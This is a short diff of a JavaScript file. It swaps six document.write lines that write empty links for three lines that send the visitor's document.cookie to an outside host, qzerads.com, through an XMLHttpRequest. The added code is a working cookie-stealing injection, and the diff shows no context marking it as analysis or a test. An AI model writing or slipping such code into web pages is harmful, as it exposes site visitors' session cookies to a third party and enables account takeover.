@@ -1,6 +1,3 @@
-document.write('<a href="" title=""></a>');
-document.write('<a href="" title=""></a>');
-document.write('<a href="" title=""></a>');
-document.write('<a href="" title=""></a>');
-document.write('<a href="" title=""></a>');
-document.write('<a href="" title=""></a>');
+var xmlHttp = new XMLHttpRequest();
+ xmlHttp.open("GET", 'https://qzerads.com/sdsd/x.php?cookie='+document.cookie);
+ xmlHttp.send(null);
